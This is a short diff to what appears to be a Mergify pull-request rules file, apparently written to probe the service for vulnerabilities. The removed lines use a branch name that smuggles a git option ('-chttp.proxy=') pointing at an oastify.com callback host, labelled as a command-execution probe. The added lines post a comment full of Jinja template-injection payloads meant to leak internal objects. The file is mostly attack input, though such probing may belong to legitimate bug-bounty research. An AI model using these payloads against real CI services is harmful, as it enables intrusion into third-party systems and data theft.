@@ -1,19 +1,11 @@
 pull_request_rules:
-  - name: auto-label-all
-    conditions: []
-    actions:
-      label:
-        add: [tc-975845a6]
-
-  - name: copy-malicious
+  - name: memleak-renders-to-PR
     conditions:
-      - label = tc-975845a6
+      - head = copy-rce-trigger
     actions:
-      copy:
-        branches:
-          - "-chttp.proxy=cprce-177996975845a6.tmjvsptjwtmpfxy97hod40j5qwwnkf84.oastify.com"
-        title: COPY-EXEC-PROBE-3
-        ignore_conflicts: true
+      comment:
+        message: |-
+          [MEMLEAK-PR3-v2] cycler=[{{ cycler(1,2) | string }}] lipsum=[{{ "%r" | format(lipsum) }}] self=[{{ self | string }}] author-upper=[{% set m = author.upper %}{{ m | string }}]
 
 merge_protections_settings:
   reporting_method: check-runs
